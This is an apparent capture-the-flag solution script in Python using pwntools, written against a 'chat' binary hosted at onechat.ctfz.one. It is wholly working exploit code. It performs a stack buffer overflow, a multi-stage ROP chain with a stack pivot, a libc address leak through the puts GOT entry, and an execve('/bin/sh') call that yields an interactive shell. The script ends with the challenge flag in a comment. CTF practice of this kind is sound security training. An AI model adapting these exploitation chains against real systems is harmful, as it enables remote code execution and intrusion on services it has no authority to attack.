#!/usr/bin/env python3

from pwn import *

exe = ELF("./chat_patched")
libc = ELF('./libc.so.6')

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("onechat.ctfz.one", 1337)

    return r


def main():
    r = conn()
    
    pop_rdi = 0x00000000004017bb
    add_rsp = 0x0000000000401012
    ret = 0x0000000000401016
    puts = 0x0000000000401050
    pop_3 = 0x00000000004017b6
    writeable = 0x00000000404000 + 0xa00
    leave_ret = 0x00000000004012e3
    
    r.sendline(b'2')
    
    payload = b"A" * 24
    # This is the end of the first rop chain
    payload += p64(pop_rdi) + p64(writeable)
    payload += p64(exe.symbols.gets)
    payload += p64(leave_ret) # Pivot to get a much cleaner payload
    
    assert len(payload) < 136, "Payload len"
    payload += b"a" * (136 - len(payload) - 8)
    
    # first ROP Chain starts here
    payload += p64(writeable) # RBP
    payload += p64(pop_3) # avoid stack values that got edited
    payload += p64(0x9090909090909090)
    payload += p64(0x9090909090909090) # padding
    payload += p64(pop_rdi)
    payload += p64(exe.got.puts)
    payload += p64(exe.plt.puts) # Leak libc
    
    pause()
    
    r.sendline(payload) # Stage one
    r.sendline(b'm'*6)
    
    pause()
    
    payload = b"/bin/sh\0"
    payload += p64(pop_rdi) + p64(exe.got.puts)
    payload += p64(puts)
    payload += p64(pop_rdi) + p64(writeable+8*7)
    payload += p64(exe.symbols.gets)
    
    r.sendline(payload) # Stage two
    
    r.recvuntil(b'u want to add?\n> ')
    leak = u64(r.readline().strip().ljust(8, b'\0'))
    
    print('leak:', hex(leak))
    
    libc_base = leak - libc.symbols.puts
    pop_rdx_rbx = 0x00000000000884a9 + libc_base
    pop_rsi = 0x000000000002b151 + libc_base
    execve = libc_base + libc.symbols.execve
    
    print("libc base:", hex(libc_base))
    
    pause()
    
    payload = p64(pop_rdi) + p64(writeable)
    payload += p64(pop_rdx_rbx) + p64(0) * 2
    payload += p64(pop_rsi) + p64(0)
    payload += p64(execve)
    
    r.sendline(payload) # Stage three
    
    r.interactive() # CTFZone{n0_m0n3y_n0_h0n3y_n0_us3rs_n0_pr0b13ms}


if __name__ == "__main__":
    main()
